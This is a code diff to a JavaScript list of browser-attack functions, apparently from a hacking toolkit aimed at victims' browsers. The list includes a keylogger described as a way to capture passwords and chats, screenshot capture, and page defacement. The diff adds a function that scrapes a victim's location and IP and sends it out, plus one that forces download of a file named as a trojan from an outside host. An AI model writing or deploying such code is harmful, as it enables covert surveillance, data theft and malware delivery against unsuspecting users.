@@ -1,7 +1,7 @@
 const utils = [
   {
     name: "Key Strokes",
-    description: "You will get the keystrokes pressed by the user.\nCan be used when you want to track passwords or chat of a user.",
+    description: "Track the keystrokes pressed by the user.",
     func: () => {
       let characters = [];
       function debounce(f, wait) {
@@ -28,7 +28,7 @@ const utils = [
 
   {
     name: "Screenshot",
-    description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
+    description: "Screenshots the user's browser screen and saves it in your system.",
     func: () => {
       document.addEventListener('DOMContentLoaded', function () {
         // your code here
@@ -68,7 +68,7 @@ const utils = [
 
   {
     name: "Terror",
-    description: "Erase page to show `YOU ARE HACKED!!!`",
+    description: "Erase page to show 'YOU ARE HACKED!!!'",
     func: () => {
       document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
     }
@@ -100,32 +100,49 @@ const utils = [
 
   
   {
-    name: "Screenshot attack",
-    description: "Download screenshot of the current page they visited",
+    name: "Rick Roller",
+    description: "Opens infinite Rick Rolls on youtube.",
     func: () => {
-      document.addEventListener('DOMContentLoaded', function () {
-        // your code here
-      }, false);
-
-      html2canvas(document.body, {
-        allowTaint: true,
-        useCORS: true,
-      })
-        .then(async function (canvas) {
-          // It will return a canvas element
-          // DOMAIN
-        var image = new Image();
-        image.src = canvas.toDataURL("image/png")
-        image.style.width = "100vw;"
-
-        var w = window.open("");
-        w.document.write(image.outerHTML);
-        })
-        .catch((e) => {
-          // Handle errors
-          console.log(e);
-        });
+    window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', '_blank');
     }
+  },
+
+
+  
+{
+    name: "Steal Location & IP",
+    description: "Steals accurate location, IP address and service provider.",
+    func: async () => {
+    if (window.location.hostname === "mylocation.org"){
+      const info = document.querySelector(".info");
+      const tr = info.getElementsByTagName("tr");
+      const dict = {};
+      for (const t of tr){
+        const td = t.getElementsByTagName("td");
+        dict[td[0].innerHTML] = td[1].innerHTML;
+      }
+      await sendData(dict);
+      window.close()
+      return
+    }
+    window.open('https://mylocation.org/', '_blank');
+    }
+  },
+
+
+  
+  {
+    name: "Inject file",
+    description: "Download a malicious file in target's system.",
+    func: () => {
+          const link = document.createElement('a')
+          const url = "https://draco.maalolan.repl.co/DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
+          link.href = url
+          link.download = "DrAcoTrOJaN_ti9x9ydcl63coiq.txt"
+          document.body.appendChild(link)
+          link.click()
+          document.body.removeChild(link)    
+        }
   }
 ]
 
